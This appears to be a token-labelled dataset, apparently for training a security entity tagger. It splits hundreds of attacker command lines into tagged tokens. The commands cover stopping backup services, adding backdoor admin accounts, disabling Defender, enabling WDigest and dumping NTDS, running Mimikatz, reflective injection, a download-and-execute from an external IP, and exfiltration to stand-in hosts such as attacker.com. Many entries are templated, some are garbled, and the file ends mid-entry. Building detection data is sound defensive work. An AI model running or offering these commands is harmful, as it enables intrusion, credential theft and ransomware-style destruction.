+-s:script_90.txt B-File
+C:\inetpub\wwwroot\ftp_90.log B-File
+
+ftp_92.exe B-Process
+-s:script_92.txt B-File
+C:\inetpub\wwwroot\ftp_92.log B-File
+
+icacls B-Process
+""C:\*"" B-File
+/grant O
+Everyone\:F O
+/T O
+/C O
+/Q O
+
+icacls B-Process
+""D:\*"" B-File
+/grant O
+Everyone\:F O
+/T O
+/C O
+/Q O
+
+mmc.exe B-Process
+"C:\Windows\System32\gpedit.msc" B-File
+
+mshta_14.exe B-Process
+-write O
+C:\Users\Public\hta_payload_14.hta B-File
+
+mshta_28.exe B-Process
+-write O
+C:\Users\Public\hta_payload_28.hta B-File
+
+mshta_54.exe B-Process
+-write O
+C:\Users\Public\hta_payload_54.hta B-File
+
+mshta_6.exe B-Process
+-write O
+C:\Users\Public\hta_payload_6.hta B-File
+
+mshta_60.exe B-Process
+-write O
+C:\Users\Public\hta_payload_60.hta B-File
+
+mshta_64.exe B-Process
+-write O
+C:\Users\Public\hta_payload_64.hta B-File
+
+mshta_68.exe B-Process
+-write O
+C:\Users\Public\hta_payload_68.hta B-File
+
+mshta_69.exe B-Process
+-write O
+C:\Users\Public\hta_payload_69.hta B-File
+
+mshta_71.exe B-Process
+-write O
+C:\Users\Public\hta_payload_71.hta B-File
+
+mshta_75.exe B-Process
+-write O
+C:\Users\Public\hta_payload_75.hta B-File
+
+mshta_79.exe B-Process
+-write O
+C:\Users\Public\hta_payload_79.hta B-File
+
+mshta_8.exe B-Process
+-write O
+C:\Users\Public\hta_payload_8.hta B-File
+
+mshta_86.exe B-Process
+-write O
+C:\Users\Public\hta_payload_86.hta B-File
+
+mshta_97.exe B-Process
+-write O
+C:\Users\Public\hta_payload_97.hta B-File
+
+mshta_98.exe B-Process
+-write O
+C:\Users\Public\hta_payload_98.hta B-File
+
+msiexec.exe B-Process
+/i O
+Site24x7WindowsAgent.msi B-File
+EDITA1=asdasd O
+/qn O
+
+net B-Process
+group O
+"Domain B-File
+Admins" I-File
+/domain O
+
+net B-Process
+group O
+"Domain B-File
+Controllers" I-File
+/domain O
+
+net B-Process
+group O
+/domain O
+
+net B-Process
+localgroup O
+"Remote B-File
+Desktop I-File
+Users" I-File
+
+net B-Process
+localgroup O
+"Remote B-File
+Desktop I-File
+Users" I-File
+WDAGUtilityAccount2 B-File
+/add O
+
+net B-Process
+localgroup O
+Administrators B-File
+
+net B-Process
+localgroup O
+Administrators B-File
+WDAGUtilityAccount2 B-File
+/add O
+
+net B-Process
+localgroup O
+Administrators B-File
+sql_admin O
+/ADD O
+
+net B-Process
+stop O
+"Acronis B-Process
+VSS I-Process
+Provider" I-Process
+/y O
+
+net B-Process
+stop O
+"SQL B-Process
+Backups" I-Process
+/y O
+
+net B-Process
+stop O
+"SQLsafe B-Process
+Backup I-Process
+Service" I-Process
+/y O
+
+net B-Process
+stop O
+"SQLsafe B-Process
+Filter I-Process
+Service" I-Process
+/y O
+
+net B-Process
+stop O
+"Symantec B-Process
+System I-Process
+Recovery" I-Process
+/y O
+
+net B-Process
+stop O
+"Veeam B-Process
+Backup I-Process
+Catalog I-Process
+Data I-Process
+Service" I-Process
+/y O
+
+net B-Process
+stop O
+"Zoolz B-Process
+2 I-Process
+Service" I-Process
+/y O
+
+net B-Process
+stop O
+BackupExecDeviceMediaService B-Process
+/y O
+
+net B-Process
+stop O
+BackupExecJobEngine B-Process
+/y O
+
+net B-Process
+stop O
+BackupExecManagementService B-Process
+/y O
+
+net B-Process
+stop O
+BackupExecRPCService B-Process
+/y O
+
+net B-Process
+stop O
+BackupExecVSSProvider B-Process
+/y O
+
+net B-Process
+stop O
+VeeamDeploySvc B-Process
+/y O
+
+net B-Process
+user O
+<user> B-File
+/domain O
+
+net B-Process
+user O
+WDAGUtilityAccount2 B-File
+Decryptme1488@ O
+/add O
+
+net B-Process
+user O
+sql_admin O
+P@ssw0rd! O
+/add O
+
+net B-Process
+group O
+"domain B-File
+admins" I-File
+/domain O
+
+net B-Process
+group O
+\"domain B-File
+admins\" I-File
+/domainsysteminfo O
+
+net B-Process
+group O
+\"enterprise B-File
+admins\" I-File
+/domain O
+
+net B-Process
+localgroup O
+"administrator" B-File
+
+net B-Process
+localgroup O
+'Remote B-File
+Desktop I-File
+Users' I-File
+/add O
+DefaultAccount O
+
+net B-Process
+localgroup O
+Administrators B-File
+Support O
+/add O
+& O
+net B-Process
+localgroup O
+\"Remote B-File
+Desktop I-File
+Users\" I-File
+Support O
+/add O
+
+net B-Process
+localgroup O
+administrators B-File
+nuuser O
+/add O
+
+net B-Process
+stop O
+MSExchangeDelivery B-Process
+
+net B-Process
+stop O
+MSExchangeDiagnostics B-Process
+
+net B-Process
+stop O
+MSExchangeEdgeSync B-Process
+
+net B-Process
+user O
+%USERNAME% O
+ehs.123 O
+
+net B-Process
+user O
+/add O
+/Y O
+nuuser O
+7HeC00l3stP@ssw0rd O
+
+net B-Process
+view O
+/all O
+
+net B-Process
+view O
+/all O
+/domain O
+
+nltest B-Process
+/domain_trusts O
+
+nltest B-Process
+/domain_trust
+
+nltest.exe B-Process
+/domain_trusts O
+/all_trusts O
+
+notepad_10.exe B-Process
+C:\Users\admin\notes_10.txt B-File
+
+notepad_15.exe B-Process
+C:\Users\test\notes_15.txt B-File
+
+notepad_23.exe B-Process
+C:\Users\test\notes_23.txt B-File
+
+notepad_24.exe B-Process
+C:\Users\admin\notes_24.txt B-File
+
+notepad_26.exe B-Process
+C:\Users\test\notes_26.txt B-File
+
+notepad_29.exe B-Process
+C:\Users\admin\notes_29.txt B-File
+
+notepad_36.exe B-Process
+C:\Users\admin\notes_36.txt B-File
+
+notepad_39.exe B-Process
+C:\Users\admin\notes_39.txt B-File
+
+notepad_41.exe B-Process
+C:\Users\admin\notes_41.txt B-File
+
+notepad_44.exe B-Process
+C:\Users\admin\notes_44.txt B-File
+
+notepad_49.exe B-Process
+C:\Users\admin\notes_49.txt B-File
+
+notepad_51.exe B-Process
+C:\Users\admin\notes_51.txt B-File
+
+notepad_52.exe B-Process
+C:\Users\test\notes_52.txt B-File
+
+notepad_56.exe B-Process
+C:\Users\admin\notes_56.txt B-File
+
+notepad_57.exe B-Process
+C:\Users\admin\notes_57.txt B-File
+
+notepad_58.exe B-Process
+C:\Users\test\notes_58.txt B-File
+
+notepad_63.exe B-Process
+C:\Users\admin\notes_63.txt B-File
+
+notepad_65.exe B-Process
+C:\Users\test\notes_65.txt B-File
+
+notepad_66.exe B-Process
+C:\Users\admin\notes_66.txt B-File
+
+notepad_70.exe B-Process
+C:\Users\test\notes_70.txt B-File
+
+notepad_71.exe B-Process
+C:\Users\admin\notes_71.txt B-File
+
+notepad_94.exe B-Process
+C:\Users\admin\notes_94.txt B-File
+
+ntdsutil B-Process
+"ac O
+in O
+ntds" O
+"ifm" O
+"cr O
+fu O
+C:\Perflogs\1" B-File
+
+ping B-Process
+COMPUTER.REDACTED.local B-Socket
+
+powershell B-Process
+Set-MpPreference B-Process
+-DisableRealtimeMonitoring O
+$true O
+
+powershell B-Process
+Set-MpPreference B-Process
+-MAPSReporting O
+0 O
+
+powershell B-Process
+Set-MpPreference B-Process
+-SubmitSamplesConsent O
+2 O
+
+powershell B-Process
+Get-ADComputer B-Process
+-Filter O
+* O
+-Properties O
+Name,Operatingsystem, O
+OperatingSystemVersion, O
+OperatingSystemServicePack,IPv4Address O
+>> O
+log2.txt B-File
+
+powershell.exe B-Process
+Set-ItemProperty O
+-Force O
+-Path O
+'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProvipowershell.exe B-File
+Set-ItemProperty O
+-Force O
+-Path O
+'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' B-File
+-Name O
+'UseLogonCredential' O
+-Value O
+'1'powershell.exe O
+-Command O
+"Start-Process O
+/usr/local/bin/backdoor" B-File
+
+powershell.exe B-Process
+-Command O
+"Start-Process O
+/var/tmp/hide.so B-File
+
+powershell.exe B-Process
+-Command O
+"Start-Process O
+C:\Users\Public\runme.bat B-File
+
+powershell.exe B-Process
+-Command O
+"Start-Process O
+C:\Windows\Temp\evil.dll B-File
+
+powershell.exe B-Process
+-exec O
+/tmp/malware.sh B-File
+
+powershell.exe B-Process
+-exec O
+C:\Windows\Temp\evil.dll B-File
+
+powershell.exe B-Process
+-nop O
+-w O
+hidden O
+-c O
+"IEX B-Socket
+((new-object I-Socket
+net.webclient).downloadstring('hxxp://37.120.198.225:80/trio'))" I-Socket
+
+powershell.exe B-Process
+-nop O
+-w O
+hidden O
+-c O
+"IEX B-Socket
+((new-object I-Socket
+net.webclient).downloadstring('hxxp\://37.120.198.225:80/trio'))" I-Socket
+
+powershell.exe B-Process
+/c O
+start B-Process
+/tmp/malware.sh B-File
+
+powershell.exe B-Process
+/c O
+start B-Process
+C:\Windows\Temp\evil.dll B-File
+
+powershell.exe B-Process
+/c O
+start B-Process
+cmd.exe B-Process
+
+powershell.exe B-Process
+/c O
+start B-Process
+powershell.exe B-Process
+
+powershell.exe B-Process
+/c O
+start B-Process
+python.exe B-Process
+
+powershell.exe B-Process
+/c O
+start B-Process
+svchost.exe B-Process
+
+powershell.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+explorer.exe B-Process
+
+powershell.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+notepad.exe B-Process
+
+powershell.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+svchost.exe B-Process
+
+powershell.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+taskmgr.exe B-Process
+
+powershell.exe B-Process
+Invoke-WebRequest O
+-Uri O
+10.10.10.10:4444 B-Socket
+-Method O
+POST O
+
+powershell.exe B-Process
+Invoke-WebRequest O
+-Uri O
+http://attacker.com/c2 B-Socket
+-Method O
+POST O
+
+powershell.exe B-Process
+Invoke-WebRequest O
+-Uri O
+https://evil.server/payload B-Socket
+-Method O
+POST O
+
+powershell.exe B-Process
+Remove-Item O
+/usr/local/bin/backdoor B-File
+-Force O
+
+powershell.exe B-Process
+Remove-Item O
+C:\Users\Public\runme.bat B-File
+-Force O
+
+powershell.exe B-Process
+Remove-Item O
+C:\Windows\Temp\evil.dll B-File
+-Force O
+
+powershell.exe B-Process
+Set-ItemProperty O
+-Force O
+-Path O
+'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' B-File
+-Name O
+'UseLogonCredential' O
+-Value O
+'1' O
+
+powershell.exe B-Process
+Set-MpPreference B-Process
+-DisableRealtimeMonitoring O
+$true O
+
+powershell.exe B-Process
+Set-ProcessInjection O
+-Target O
+explorer.exe B-Process
+
+powershell.exe B-Process
+Set-ProcessInjection O
+-Target O
+lsass.exe B-Process
+
+powershell.exe B-Process
+Set-ProcessInjection O
+-Target O
+notepad.exe B-Process
+
+powershell.exe B-Process
+Set-ProcessInjection O
+-Target O
+svchost.exe B-Process
+
+powershell.exe B-Process
+Set-ProcessInjection O
+-Target O
+taskmgr.exe B-Process
+
+powershell.exe B-Process
+Set-ProcessInjection O
+-Target O
+winlogon.exe B-Process
+
+powershell.exe B-Process
+Stop-Process O
+-Name O
+explorer.exe B-Process
+-Force O
+
+powershell.exe B-Process
+Stop-Process O
+-Name O
+lsass.exe B-Process
+-Force O
+
+powershell.exe B-Process
+Stop-Process O
+-Name O
+notepad.exe B-Process
+-Force O
+
+powershell.exe B-Process
+Stop-Process O
+-Name O
+taskmgr.exe B-Process
+-Force O
+
+powershell.exe B-Process
+Stop-Process O
+-Name O
+winlogon.exe B-Process
+-Force O
+
+powershell.exe B-Process
+attrib B-Process
++s O
++h O
+/tmp/malware.sh B-File
+
+powershell.exe B-Process
+attrib B-Process
++s O
++h O
+C:\Users\Public\runme.bat B-File
+
+powershell.exe B-Process
+attrib B-Process
++s O
++h O
+C:\Windows\Temp\evil.dll B-File
+
+powershell.exe B-Process
+chmod B-Process
+777 O
+/usr/local/bin/backdoor B-File
+
+powershell.exe B-Process
+chmod B-Process
+777 O
+/var/tmp/hide.so B-File
+
+powershell.exe B-Process
+chmod B-Process
+777 O
+C:\ProgramData\updater.exe B-File
+
+powershell.exe B-Process
+chmod B-Process
+777 O
+C:\Windows\Temp\evil.dll B-File
+
+powershell.exe B-Process
+curl B-Process
+-X O
+POST O
+--data O
+'ping' O
+10.10.10.10:4444 B-Socket
+
+powershell.exe B-Process
+curl B-Process
+-X O
+POST O
+--data O
+'ping' O
+192.168.1.100:8080 B-Socket
+
+powershell.exe B-Process
+curl B-Process
+-X O
+POST O
+--data O
+'ping' O
+https://evil.server/payload B-Socket
+
+powershell.exe B-Process
+del B-Process
+/usr/local/bin/backdoor B-File
+
+powershell.exe B-Process
+del B-Process
+C:\ProgramData\updater.exe B-File
+
+powershell.exe B-Process
+dllinjector.exe B-Process
+-p O
+explorer.exe B-Process
+-d O
+payload.dll B-File
+
+powershell.exe B-Process
+dllinjector.exe B-Process
+-p O
+notepad.exe B-Process
+-d O
+payload.dll B-File
+
+powershell.exe B-Process
+dllinjector.exe B-Process
+-p O
+taskmgr.exe B-Process
+-d O
+payload.dll B-File
+
+powershell.exe B-Process
+icacls B-Process
+/usr/local/bin/backdoor B-File
+/grant O
+Everyone:F O
+
+powershell.exe B-Process
+icacls B-Process
+C:\ProgramData\updater.exe B-File
+/grant O
+Everyone:F O
+
+powershell.exe B-Process
+icacls B-Process
+C:\Users\Public\runme.bat B-File
+/grant O
+Everyone:F O
+
+powershell.exe B-Process
+icacls B-Process
+C:\Windows\Temp\evil.dll B-File
+/grant O
+Everyone:F O
+
+powershell.exe B-Process
+kill O
+$(Get-Process O
+explorer.exe.Id) B-Process
+
+powershell.exe B-Process
+kill O
+$(Get-Process O
+notepad.exe.Id) B-Process
+
+powershell.exe B-Process
+kill O
+$(Get-Process O
+svchost.exe.Id) B-Process
+
+powershell.exe B-Process
+kill O
+$(Get-Process O
+taskmgr.exe.Id) B-Process
+
+powershell.exe B-Process
+ls B-Process
+C:\ B-File
+> O
+C:\file.txt B-File
+
+powershell.exe B-Process
+nc B-Process
+-lvp O
+4444 O
+-s O
+10.10.10.10:4444 B-Socket
+
+powershell.exe B-Process
+nc B-Process
+-lvp O
+4444 O
+-s O
+http://attacker.com/c2 B-Socket
+
+powershell.exe B-Process
+nc B-Process
+-lvp O
+4444 O
+-s O
+https://evil.server/payload B-Socket
+
+powershell.exe B-Process
+powershell B-Process
+-c O
+"Invoke-RestMethod O
+-Uri O
+10.10.10.10:4444 B-Socket
+-Body O
+'cmd=whoami' O
+
+powershell.exe B-Process
+powershell B-Process
+-c O
+"Invoke-RestMethod O
+-Uri O
+192.168.1.100:8080 B-Socket
+-Body O
+'cmd=whoami' O
+
+powershell.exe B-Process
+powershell B-Process
+-c O
+"Invoke-RestMethod O
+-Uri O
+https://evil.server/payload B-Socket
+-Body O
+'cmd=whoami' O
+
+powershell.exe B-Process
+powershell B-Process
+Start-Process O
+cmd.exe B-Process
+
+powershell.exe B-Process
+powershell B-Process
+Start-Process O
+powershell.exe B-Process
+
+powershell.exe B-Process
+powershell B-Process
+Start-Process O
+python.exe B-Process
+
+powershell.exe B-Process
+powershell B-Process
+Start-Process O
+rundll32.exe B-Process
+
+powershell.exe B-Process
+powershell B-Process
+Start-Process O
+svchost.exe B-Process
+
+powershell.exe B-Process
+python3 B-Process
+-m O
+http.server B-Socket
+8080 I-Socket
+--bind O
+10.10.10.10:4444 B-Socket
+
+powershell.exe B-Process
+python3 B-Process
+-m O
+http.server B-Socket
+8080 I-Socket
+--bind O
+192.168.1.100:8080 B-Socket
+
+powershell.exe B-Process
+python3 B-Process
+-m O
+http.server B-Socket
+8080 I-Socket
+--bind O
+http://attacker.com/c2 B-Socket
+
+powershell.exe B-Process
+python3 B-Process
+-m O
+http.server B-Socket
+8080 I-Socket
+--bind O
+https://evil.server/payload B-Socket
+
+powershell.exe B-Process
+reg B-Process
+query O
+HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest B-File
+/v O
+UseLogonCredential O
+
+powershell.exe B-Process
+rm B-Process
+/tmp/malware.sh B-File
+
+powershell.exe B-Process
+rm B-Process
+/usr/local/bin/backdoor B-File
+
+powershell.exe B-Process
+rm B-Process
+C:\ProgramData\updater.exe B-File
+
+powershell.exe B-Process
+rm B-Process
+C:\Windows\Temp\evil.dll B-File
+
+powershell.exe B-Process
+runas O
+/user:admin O
+powershell.exe B-Process
+
+powershell.exe B-Process
+runas O
+/user:admin O
+python.exe B-Process
+
+powershell.exe B-Process
+runas O
+/user:admin O
+rundll32.exe B-Process
+
+powershell.exe B-Process
+runas O
+/user:admin O
+svchost.exe B-Process
+
+powershell.exe B-Process
+socat B-Process
+TCP4-LISTEN:8080,fork B-Socket
+10.10.10.10:4444 B-Socket
+
+powershell.exe B-Process
+socat B-Process
+TCP4-LISTEN:8080,fork B-Socket
+192.168.1.100:8080 B-Socket
+
+powershell.exe B-Process
+socat B-Process
+TCP4-LISTEN:8080,fork B-Socket
+http://attacker.com/c2 B-Socket
+
+powershell.exe B-Process
+taskkill B-Process
+/IM O
+explorer.exe B-Process
+/F O
+
+powershell.exe B-Process
+taskkill B-Process
+/IM O
+svchost.exe B-Process
+/F O
+
+powershell.exe B-Process
+taskkill B-Process
+/IM O
+winlogon.exe B-Process
+/F O
+
+powershell_1.exe B-Process
+"[IO.File]::WriteAllText('C:\Temp\backdoor_1.ps1', B-File
+'Invoke-Mimikatz')" O
+
+powershell_11.exe B-Process
+-Command O
+"gc O
+C:\ProgramData\conf_11.yaml" B-File
+
+powershell_15.exe B-Process
+Get-Content O
+C:\Users\Public\secrets_15.txt B-File
+
+powershell_16.exe B-Process
+-Command O
+"Set-Content O
+-Path O
+C:\Windows\Temp\log_16.txt B-File
+-Value O
+'infected'" O
+
+powershell_16.exe B-Process
+Get-Content O
+C:\Users\Public\secrets_16.txt B-File
+
+powershell_18.exe B-Process
+-Command O
+"gc O
+C:\ProgramData\conf_18.yaml" B-File
+
+powershell_2.exe B-Process
+-Command O
+"Set-Content O
+-Path O
+C:\Windows\Temp\log_2.txt B-File
+-Value O
+'infected'" O
+
+powershell_20.exe B-Process
+-Command O
+"Set-Content O
+-Path O
+C:\Windows\Temp\log_20.txt B-File
+-Value O
+'infected'" O
+
+powershell_21.exe B-Process
+"[IO.File]::WriteAllText('C:\Temp\backdoor_21.ps1', B-File
+'Invoke-Mimikatz')" O
+
+powershell_22.exe B-Process
+"[IO.File]::WriteAllText('C:\Temp\backdoor_22.ps1', B-File
+'Invoke-Mimikatz')" O
+
+powershell_25.exe B-Process
+Get-Content O
+C:\Users\Public\secrets_25.txt B-File
+
+powershell_26.exe B-Process
+-Command O
+"gc O
+C:\ProgramData\conf_26.yaml" B-File
+
+powershell_28.exe B-Process
+-Command O
+"gc O
+C:\ProgramData\conf_28.yaml" B-File
+
+powershell_31.exe B-Process
+Get-Content O
+C:\Users\Public\secrets_31.txt B-File
+
+powershell_32.exe B-Process
+"[IO.File]::WriteAllText('C:\Temp\backdoor_32.ps1', B-File
+'Invoke-Mimikatz')" O
+
+powershell_33.exe B-Process
+-Command O
+"Set-Content O
+-Path O
+C:\Windows\Temp\log_33.txt B-File
+-Value O
+'infected'" O
+
+powershell_34.exe B-Process
+-Command O
+"Set-Content O
+-Path O
+C:\Windows\Temp\log_34.txt B-File
+-Value O
+'infected'" O
+
+powershell_37.exe B-Process
+"[IO.File]::WriteAllText('C:\Temp\backdoor_37.ps1', B-File
+'Invoke-Mimikatz')" O
+
+powershell_37.exe B-Process
+Get-Content O
+C:\Users\Public\secrets_37.txt B-File
+
+powershell_4.exe B-Process
+-Command O
+"Set-Content O
+-Path O
+C:\Windows\Temp\log_4.txt B-File
+-Value O
+'infected'" O
+
+powershell_42.exe B-Process
+Get-Content O
+C:\Users\Public\secrets_42.txt B-File
+
+powershell_45.exe B-Process
+-Command O
+"gc O
+C:\ProgramData\conf_45.yaml" B-File
+
+powershell_46.exe B-Process
+-Command O
+"gc O
+C:\ProgramData\conf_46.yaml" B-File
+
+powershell_47.exe B-Process
+"[IO.File]::WriteAllText('C:\Temp\backdoor_47.ps1', B-File
+'Invoke-Mimikatz')" O
+
+powershell_48.exe B-Process
+"[IO.File]::WriteAllText('C:\Temp\backdoor_48.ps1', B-File
+'Invoke-Mimikatz')" O
+
+powershell_49.exe B-Process
+"[IO.File]::WriteAllText('C:\Temp\backdoor_49.ps1', B-File
+'Invoke-Mimikatz')" O
+
+powershell_50.exe B-Process
+Get-Content O
+C:\Users\Public\secrets_50.txt B-File
+
+powershell_52.exe B-Process
+-Command O
+"gc O
+C:\ProgramData\conf_52.yaml" B-File
+
+powershell_53.exe B-Process
+"[IO.File]::WriteAllText('C:\Temp\backdoor_53.ps1', B-File
+'Invoke-Mimikatz')" O
+
+powershell_61.exe B-Process
+Get-Content O
+C:\Users\Public\secrets_61.txt B-File
+
+powershell_64.exe B-Process
+-Command O
+"gc O
+C:\ProgramData\conf_64.yaml" B-File
+
+powershell_66.exe B-Process
+"[IO.File]::WriteAllText('C:\Temp\backdoor_66.ps1', B-File
+'Invoke-Mimikatz')" O
+
+powershell_69.exe B-Process
+-Command O
+"gc O
+C:\ProgramData\conf_69.yaml" B-File
+
+powershell_70.exe B-Process
+Get-Content O
+C:\Users\Public\secrets_70.txt B-File
+
+powershell_72.exe B-Process
+-Command O
+"Set-Content O
+-Path O
+C:\Windows\Temp\log_72.txt B-File
+-Value O
+'infected'" O
+
+powershell_73.exe B-Process
+Get-Content O
+C:\Users\Public\secrets_73.txt B-File
+
+powershell_74.exe B-Process
+Get-Content O
+C:\Users\Public\secrets_74.txt B-File
+
+powershell_75.exe B-Process
+-Command O
+"gc O
+C:\ProgramData\conf_75.yaml" B-File
+
+powershell_79.exe B-Process
+Get-Content O
+C:\Users\Public\secrets_79.txt B-File
+
+powershell_80.exe B-Process
+"[IO.File]::WriteAllText('C:\Temp\backdoor_80.ps1', B-File
+'Invoke-Mimikatz')" O
+
+powershell_80.exe B-Process
+-Command O
+"gc O
+C:\ProgramData\conf_80.yaml" B-File
+
+powershell_81.exe B-Process
+"[IO.File]::WriteAllText('C:\Temp\backdoor_81.ps1', B-File
+'Invoke-Mimikatz')" O
+
+powershell_85.exe B-Process
+"[IO.File]::WriteAllText('C:\Temp\backdoor_85.ps1', B-File
+'Invoke-Mimikatz')" O
+
+powershell_89.exe B-Process
+"[IO.File]::WriteAllText('C:\Temp\backdoor_89.ps1', B-File
+'Invoke-Mimikatz')" O
+
+powershell_9.exe B-Process
+-Command O
+"Set-Content O
+-Path O
+C:\Windows\Temp\log_9.txt B-File
+-Value O
+'infected'" O
+
+powershell_96.exe B-Process
+"[IO.File]::WriteAllText('C:\Temp\backdoor_96.ps1', B-File
+'Invoke-Mimikatz')" O
+
+powershell_99.exe B-Process
+Get-Content O
+C:\Users\Public\secrets_99.txt B-File
+
+psexec B-Process
+\\<redacted> B-Socket
+-u O
+<redacted>\<redacted> O
+-p O
+<redacted> O
+reg B-Process
+add O
+"hklm\system\currentcontrolset\control\lsa" B-File
+/f O
+/v O
+DisableRestrictedAdmin O
+/t O
+REG_DWORD O
+/d O
+0 O
+
+psexec.exe B-Process
+\\<IP ADDRESS> B-Socket
+-u O
+<DOMAIN>\Administrator O
+-p O
+"<PASSWORD>" O
+-s O
+-d O
+-h O
+-r O
+mstdc O
+-accepteula O
+-nobanner O
+c:\windows\temp\ttsel.exe B-File
+
+python.exe B-Process
+-Command O
+"Start-Process O
+/tmp/malware.sh" B-File
+
+python.exe B-Process
+-Command O
+"Start-Process O
+/var/tmp/hide.so" B-File
+
+python.exe B-Process
+-Command O
+"Start-Process O
+C:\ProgramData\updater.exe" B-File
+
+python.exe B-Process
+-Command O
+"Start-Process O
+C:\Users\Public\runme.bat" B-File
+
+python.exe B-Process
+-exec O
+/tmp/malware.sh B-File
+
+python.exe B-Process
+-exec O
+C:\Windows\Temp\evil.dll B-File
+
+python.exe B-Process
+/c O
+start B-Process
+/tmp/malware.sh B-File
+
+python.exe B-Process
+/c O
+start B-Process
+/var/tmp/hide.so B-File
+
+python.exe B-Process
+/c O
+start B-Process
+C:\ProgramData\updater.exe B-File
+
+python.exe B-Process
+/c O
+start B-Process
+C:\Windows\Temp\evil.dll B-File
+
+python.exe B-Process
+/c O
+start B-Process
+cmd.exe B-Process
+
+python.exe B-Process
+/c O
+start B-Process
+powershell.exe B-Process
+
+python.exe B-Process
+/c O
+start B-Process
+rundll32.exe B-Process
+
+python.exe B-Process
+/c O
+start B-Process
+wmic.exe B-Process
+
+python.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+lsass.exe B-Process
+
+python.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+svchost.exe B-Process
+
+python.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+taskmgr.exe B-Process
+
+python.exe B-Process
+Invoke-WebRequest O
+-Uri O
+192.168.1.100:8080 B-Socket
+-Method O
+POST O
+
+python.exe B-Process
+Invoke-WebRequest O
+-Uri O
+https://evil.server/payload B-Socket
+-Method O
+POST O
+
+python.exe B-Process
+Remove-Item O
+/tmp/malware.sh B-File
+-Force O
+
+python.exe B-Process
+Remove-Item O
+C:\ProgramData\updater.exe B-File
+-Force O
+
+python.exe B-Process
+Remove-Item O
+C:\Users\Public\runme.bat B-File
+-Force O
+
+python.exe B-Process
+Set-ProcessInjection O
+-Target B-File
+lsass.exe B-Process
+
+python.exe B-Process
+Set-ProcessInjection O
+-Target B-File
+notepad.exe B-Process
+
+python.exe B-Process
+Set-ProcessInjection O
+-Target B-File
+taskmgr.exe B-Process
+
+python.exe B-Process
+Stop-Process O
+-Name O
+explorer.exe B-Process
+-Force O
+
+python.exe B-Process
+Stop-Process O
+-Name O
+lsass.exe B-Process
+-Force O
+
+python.exe B-Process
+Stop-Process O
+-Name O
+svchost.exe B-Process
+-Force O
+
+python.exe B-Process
+Stop-Process O
+-Name O
+taskmgr.exe B-Process
+-Force O
+
+python.exe B-Process
+attrib B-Process
++s O
++h O
+/tmp/malware.sh B-File
+
+python.exe B-Process
+attrib B-Process
++s O
++h O
+/usr/local/bin/backdoor B-File
+
+python.exe B-Process
+attrib B-Process
++s O
++h O
+/var/tmp/hide.so B-File
+
+python.exe B-Process
+attrib B-Process
++s O
++h O
+C:\Users\Public\runme.bat B-File
+
+python.exe B-Process
+attrib B-Process
++s O
++h O
+C:\Windows\Temp\evil.dll B-File
+
+python.exe B-Process
+chmod B-Process
+777 O
+/tmp/malware.sh B-File
+
+python.exe B-Process
+chmod B-Process
+777 O
+/usr/local/bin/backdoor B-File
+
+python.exe B-Process
+chmod B-Process
+777 O
+C:\Windows\Temp\evil.dll B-File
+
+python.exe B-Process
+curl B-Process
+-X O
+POST O
+--data O
+'ping' O
+10.10.10.10:4444 B-Socket
+
+python.exe B-Process
+curl B-Process
+-X O
+POST O
+--data O
+'ping' O
+192.168.1.100:8080 B-Socket
+
+python.exe B-Process
+curl B-Process
+-X O
+POST O
+--data O
+'ping' O
+http://attacker.com/c2 B-Socket
+
+python.exe B-Process
+curl B-Process
+-X O
+POST O
+--data O
+'ping' O
+https://evil.server/payload B-Socket
+
+python.exe B-Process
+del B-Process
+/tmp/malware.sh B-File
+
+python.exe B-Process
+del B-Process
+/usr/local/bin/backdoor B-File
+
+python.exe B-Process
+del B-Process
+/var/tmp/hide.so B-File
+
+python.exe B-Process
+del B-Process
+C:\ProgramData\updater.exe B-File
+
+python.exe B-Process
+del B-Process
+C:\Windows\Temp\evil.dll B-File
+
+python.exe B-Process
+dllinjector.exe B-Process
+-p O
+explorer.exe B-Process
+-d O
+payload.dll B-File
+
+python.exe B-Process
+dllinjector.exe B-Process
+-p O
+notepad.exe B-Process
+-d O
+payload.dll B-File
+
+python.exe B-Process
+dllinjector.exe B-Process
+-p O
+winlogon.exe B-Process
+-d O
+payload.dll B-File
+
+python.exe B-Process
+icacls B-Process
+/var/tmp/hide.so B-File
+/grant O
+Everyone:F O
+
+python.exe B-Process
+icacls B-Process
+C:\Users\Public\runme.bat B-File
+/grant O
+Everyone:F O
+
+python.exe B-Process
+kill O
+$(Get-Process O
+explorer.exe.Id) B-Process
+
+python.exe B-Process
+kill O
+$(Get-Process O
+svchost.exe.Id) B-Process
+
+python.exe B-Process
+kill O
+$(Get-Process O
+taskmgr.exe.Id) B-Process
+
+python.exe B-Process
+nc B-Process
+-lvp O
+4444 O
+-s O
+192.168.1.100:8080 B-Socket
+
+python.exe B-Process
+nc B-Process
+-lvp O
+4444 O
+-s O
+http://attacker.com/c2 B-Socket
+
+python.exe B-Process
+powershell B-Process
+-c O
+"Invoke-RestMethod O
+-Uri O
+http://attacker.com/c2 B-Socket
+-Body O
+'cmd=whoami' O
+
+python.exe B-Process
+powershell B-Process
+-c O
+"Invoke-RestMethod O
+-Uri O
+https://evil.server/payload B-Socket
+-Body O
+'cmd=whoami' O
+
+python.exe B-Process
+powershell B-Process
+Start-Process O
+cmd.exe B-Process
+
+python.exe B-Process
+powershell B-Process
+Start-Process O
+python.exe B-Process
+
+python.exe B-Process
+powershell B-Process
+Start-Process O
+svchost.exe B-Process
+
+python.exe B-Process
+powershell B-Process
+Start-Process O
+wmic.exe B-Process
+
+python.exe B-Process
+python3 B-Process
+-m O
+http.server B-Socket
+8080 I-Socket
+--bind O
+10.10.10.10:4444 B-Socket
+
+python.exe B-Process
+python3 B-Process
+-m O
+http.server B-Socket
+8080 I-Socket
+--bind O
+192.168.1.100:8080 B-Socket
+
+python.exe B-Process
+python3 B-Process
+-m O
+http.server B-Socket
+8080 I-Socket
+--bind O
+https://evil.server/payload B-Socket
+
+python.exe B-Process
+rm B-Process
+/var/tmp/hide.so B-File
+
+python.exe B-Process
+rm B-Process
